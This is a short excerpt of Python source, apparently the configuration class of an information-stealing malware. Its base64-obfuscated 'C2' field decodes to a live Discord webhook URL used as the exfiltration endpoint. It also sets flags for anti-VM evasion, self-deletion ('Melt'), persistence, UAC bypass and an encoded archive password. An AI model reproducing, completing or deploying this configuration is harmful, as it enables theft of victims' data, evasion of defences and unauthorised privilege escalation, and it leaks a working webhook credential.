...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTE2NTMwMzkxODE0MjY5MzM5Ni81OGxaRzh3dEVZVTRVT1JxMTdvc1EtQXlFNWRBcW1hRTNGWmNjdFNXWXJFVlpIX01LNDhoeDNaQ3hWODJKUnE3UFhMcw==').decode())
    Mutex = base64.b64decode('d1g0M2tEdEFrZXB1VFhNZQ==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('cGF2bGU1NDU0').decode()
